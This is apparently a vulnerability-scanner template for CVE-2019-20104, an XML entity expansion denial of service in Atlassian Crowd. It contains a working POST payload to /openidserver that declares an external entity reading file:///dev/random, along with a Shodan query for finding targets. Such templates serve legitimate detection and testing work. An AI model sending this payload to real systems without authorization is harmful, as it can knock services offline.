id: CVE-2019-20104

info:
  name: Atlassian Crowd XML Entity Expansion DoS
  author: ProjectDiscoveryAI
  severity: high
  description: The OpenID client application in Atlassian Crowd before version 3.6.2, and from version 3.7.0 before 3.7.1 allows remote attackers to perform a Denial of Service attack via an XML Entity Expansion vulnerability.
  impact: |
    Denial of Service (DoS)
  remediation: |
    Apply the necessary security patch provided by Atlassian to mitigate the vulnerability (CVE-2019-20104).
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    cvss-score: 7.5
    cve-id: CVE-2019-20104
    cwe-id: CWE-776
    epss-score: 0.00218
    epss-percentile: 0.60621
    cpe: cpe:2.3:a:atlassian:crowd:*:*:*:*:*:*:*:*
  metadata:
    vendor: atlassian
    product: crowd
    shodan-query: http.component:"Atlassian Jira"

http:
  - method: POST
    path:
      - "{{BaseURL}}/openidserver"

    headers:
      Content-Type: application/xml

    body: |
      <?xml version="1.0"?>
      <!DOCTYPE foo [
      <!ELEMENT foo ANY >
      <!ENTITY xxe SYSTEM "file:///dev/random" >]>
      <foo>&xxe;</foo>
    matchers:
      - type: dsl
        dsl:
          - "duration>=6"
